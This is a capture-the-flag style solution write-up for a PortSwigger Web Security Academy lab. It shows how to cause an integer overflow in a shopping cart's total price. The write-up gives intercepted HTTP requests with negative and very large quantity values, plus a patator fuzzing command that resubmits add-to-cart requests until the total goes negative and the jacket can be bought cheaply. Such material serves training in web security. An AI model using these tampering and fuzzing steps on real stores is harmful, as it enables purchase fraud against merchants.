# [Lab 3: Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)

---

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

Log in with the credentials `wiener:peter` and add a "Lightweight l33t lealther jacket" to your cart, generating the following request:

```http
POST /cart HTTP/1.1
Host: aca01fd91e85f06981090a23002c0089.web-security-academy.net
Cookie: session=G382eevZRoJNMpKKD2ALUrgnchZZhD5j
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net
Dnt: 1
Referer: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1
```

Navigate to the cart and attempt to check out, generating the following request:

```http
POST /cart/checkout HTTP/1.1
Host: aca01fd91e85f06981090a23002c0089.web-security-academy.net
Cookie: session=G382eevZRoJNMpKKD2ALUrgnchZZhD5j
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net
Dnt: 1
Referer: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net/cart?err=INSUFFICIENT_FUNDS
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=FR6zwPnEiM9oxlSmy2STPuaYa3D35hQ1
```

Nothing seems wrong here. The web application probably ties the `csrf` token and/or the `session` cookie to know which user's cart to process.

Intercept the request for removing the item from the cart:

```http
POST /cart HTTP/1.1
Host: aca01fd91e85f06981090a23002c0089.web-security-academy.net
Cookie: session=G382eevZRoJNMpKKD2ALUrgnchZZhD5j
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net
Dnt: 1
Referer: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net/cart?err=INSUFFICIENT_FUNDS
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&quantity=-1&redir=CART
```

Tamper with the request and attempt to add `-10` quantity of the leather jacket to the cart.

```http
POST /cart HTTP/1.1
Host: aca01fd91e85f06981090a23002c0089.web-security-academy.net
Cookie: session=G382eevZRoJNMpKKD2ALUrgnchZZhD5j
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net
Dnt: 1
Referer: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net/cart?err=INSUFFICIENT_FUNDS
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&quantity=-10&redir=CART
```

This results in the cart being emptied, as it should be.

Attempt to add the leather jacket with quantity of a very large integer value.

```http
POST /cart HTTP/1.1
Host: aca01fd91e85f06981090a23002c0089.web-security-academy.net
Cookie: session=G382eevZRoJNMpKKD2ALUrgnchZZhD5j
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net
Dnt: 1
Referer: https://aca01fd91e85f06981090a23002c0089.web-security-academy.net/cart?err=INSUFFICIENT_FUNDS
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&quantity=9223372036854775807&redir=CART
```

The application responds with:

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 29

"Invalid parameter: quantity"
```

In fact, any quantity greater than or equal to 100 results in this error.

So the quantity value itself can't be overflowed. Can the total price be though? Repeatedly submit the request to adds 99 leather jackets to the cart indefinitely. Monitor the cart page and determine if the total value ever shows any indication of overflowing.

```bash
patator http_fuzz url='https://aca01fd91e85f06981090a23002c0089.web-security-academy.net/cart' method=POST body='productId=1&quantity=99&redir=CART' header='Cookie: session=G382eevZRoJNMpKKD2ALUrgnchZZhD5j' -x retry:code=302 --max-retries=-1
```

![](images/Pasted%20image%2020210824211314.png)

Eventually, the total value does overflow and becomes a negative value. Attempt to place the order.

![](images/Pasted%20image%2020210824211517.png)

The application throws an error indicating that the total price can't be less than zero. However, as the quantities of leather jackets increases, the total price increases. Continue adding jackets until the price gets as close as possible to being between $0 and $100. Then, begin adding a few quantities of other items to get the price to settle between $0 and $100.

![](images/Pasted%20image%2020210824213449.png)

Place the order and complete the challenge.

![](images/Pasted%20image%2020210824213609.png)

